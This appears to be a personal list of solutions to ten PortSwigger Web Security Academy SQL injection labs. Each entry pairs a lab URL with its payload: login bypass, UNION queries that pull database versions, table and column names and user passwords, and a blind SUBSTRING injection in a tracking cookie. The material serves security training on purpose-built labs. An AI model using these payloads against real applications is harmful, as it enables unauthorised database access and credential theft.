# PS-academy-Labs

1. https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
     /filter?category=Clothing%2c+shoes+and+accessories%27%20OR%201%3D1%20--%20
     ' OR 1=1 -- 
2. https://portswigger.net/web-security/sql-injection/lab-login-bypass
   Solution #1
   administrator
   ' OR 1=1 --

   Solution #2
   administrator'--
  
3. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
   /filter?category=%27+UNION+SELECT+BANNER,NULL+FROM+v$version--
   
4. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
     GET /filter?category='+UNION+SELECT+@@version,+NULL# HTTP/2

5. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
   GET /filter?category='+UNION+SELECT table_name,NULL FROM information_schema.tables-- HTTP/2
   GET /filter?category='+UNION+SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_ocqdko'-- HTTP/2
   GET /filter?category='+UNION+SELECT username_qrvfyq,password_ofzdsw FROM users_ocqdko-- HTTP/2


6. https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
     GET /filter?category='+UNION+SELECT+NULL,NULL+FROM+dual--
     GET /filter?category='+UNION+SELECT+table_name,NULL+FROM+all_tables--
     GET /filter?category='+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_BEQQVS'--
     GET /filter?category='+UNION+SELECT+USERNAME_YUOEWA,PASSWORD_XHXKTJ+FROM+USERS_BEQQVS--
   
7. https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
     GET /filter?category=Pets'+UNION+SELECT+NULL,'2NSEW7',NULL--
   
8.  https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
     GET /filter?category=Pets'+UNION+SELECT+username,password+FROM+users--
    
9.  https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
     GET /filter?category=Pets'+UNION+SELECT+NULL,username||password+FROM+users--

10. https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
     GET /filter?category=Gifts HTTP/2
     Host: 0ad6007503ff60c98010453d007900de.web-security-academy.net
     Cookie: TrackingId=bmSN7mgxz39pxSxs' AND SUBSTRING((SELECT password FROM Users WHERE username = 'administrator'), 1, 20) = 'x95u9gp2jz87dvomf0fu; session=VwOufCAF9NUO7dGbHzrvkOeKjmCTMMF7
